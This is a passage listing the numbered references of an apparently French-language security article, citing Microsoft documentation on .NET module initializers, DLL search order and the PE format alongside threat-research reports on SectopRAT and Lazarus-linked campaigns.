- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Ordre de recherche des bibliothèques de liens dynamiques](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Format PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Découverte d’une variante de SectopRAT intégrée à un logiciel légitime](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Voler le LIGHTSHOW (première partie)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Opération FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
